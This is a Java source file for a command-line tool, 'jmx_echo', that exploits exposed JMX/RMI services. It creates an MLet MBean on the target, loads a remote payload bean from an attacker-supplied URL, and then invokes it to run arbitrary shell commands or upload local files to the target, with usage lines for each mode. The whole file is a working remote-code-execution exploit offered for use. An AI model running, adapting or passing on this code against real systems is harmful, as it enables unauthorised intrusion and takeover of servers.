package jmx;

import java.io.*;
import java.util.HashSet;
import java.util.Iterator;

import javax.management.InstanceAlreadyExistsException;
import javax.management.MBeanServerConnection;
import javax.management.ObjectInstance;
import javax.management.ObjectName;
import javax.management.remote.JMXConnector;
import javax.management.remote.JMXConnectorFactory;
import javax.management.remote.JMXServiceURL;

import sun.misc.BASE64Encoder;

public class jmx_echo
{
	public static String check(String serverName, String servicePort, String mLetUrl) {
		return invokeExp(serverName, servicePort, mLetUrl, "check", new Object[] {}, new String[] {});
	}
	
	public static String run(String serverName, String servicePort, String mLetUrl, String cmd) {
		return invokeExp(serverName, servicePort, mLetUrl, "run", new Object[] {cmd}, new String[] {String.class.getName()});
	}
	
	public static String upload(String serverName, String servicePort, String mLetUrl, String local, String remote) {
		try {
			BASE64Encoder encoder = new BASE64Encoder();
			FileInputStream in = new FileInputStream(local);
			byte[] buff = new byte[in.available()];
			in.read(buff);
			in.close();
			String R = encoder.encode(buff);
			return invokeExp(serverName, servicePort, mLetUrl, "upload", new Object[] {R, remote}, new String[] {String.class.getName(), String.class.getName()});
		} catch (Exception e) {
			return e.getMessage();
		}
	}
	
	public static String invokeExp(String serverName, String servicePort, String mLetUrl,
									String func, Object[] params, String[] className)
	{
		try
		{
			JMXServiceURL url = new JMXServiceURL("service:jmx:rmi:///jndi/rmi://" + serverName + ":" + servicePort + "/jmxrmi");
			JMXConnector connector = JMXConnectorFactory.connect(url);
			MBeanServerConnection mBeanServer = connector.getMBeanServerConnection();
			ObjectInstance payloadBean = null;
			ObjectInstance mLetBean = null;
			try
			{
				mLetBean = mBeanServer.createMBean("javax.management.loading.MLet", null);
			} catch (InstanceAlreadyExistsException e)
			{
				mLetBean = mBeanServer.getObjectInstance(new ObjectName("DefaultDomain:type=MLet"));
			}
			Object res = mBeanServer.invoke(mLetBean.getObjectName(), "getMBeansFromURL", 
										new Object[] { mLetUrl }, 
										new String[] { String.class.getName() });


			HashSet res_set = (HashSet)res;
			Iterator itr = res_set.iterator();
			Object nextObject = itr.next();
			if ((nextObject instanceof Exception)) {
				throw ((Exception)nextObject);
			}
			payloadBean = (ObjectInstance)nextObject;

			return (String)mBeanServer.invoke(payloadBean.getObjectName(), func, params, className);
		} catch (Exception e)
		{
			return e.getMessage();
		}
	}

	public static void main(String[] args) throws Exception
	{
		if (args.length == 3 && "check".equalsIgnoreCase(args[2]))
		{
			String[] rmi = args[1].trim().split(":");
			String target = rmi[0];
			String port = rmi.length == 1 ? "1099" : rmi[1];
			String url = args[0];
			System.out.println(check(target, port, url));
		}
		else if (args.length == 4 && "run".equalsIgnoreCase(args[2]))
		{
			String[] rmi = args[1].trim().split(":");
			String target = rmi[0];
			String port = rmi.length == 1 ? "1099" : rmi[1];
			String url = args[0];
			String cmd = args[3];
			System.out.println(run(target, port, url, cmd));
		}
		else if (args.length == 5 && "upload".equalsIgnoreCase(args[2]))
		{
			String[] rmi = args[1].trim().split(":");
			String target = rmi[0];
			String port = rmi.length == 1 ? "1099" : rmi[1];
			String url = args[0];
			String local = args[3];
			String remote = args[4];
				
			System.out.println(upload(target, port, url, local, remote));
		}
		else
		{
			System.out.println("\r\nUsage:  java -jar jmx_echo.jar <url> <ip:port> check"
					+ "\r\n\tjava -jar jmx_echo.jar <url> <ip:port> run <cmd>"
					+ "\r\n\tjava -jar jmx_echo.jar <url> <ip:port> upload <local_file> <remote_file>");
			System.exit(0);
		}
	}
}
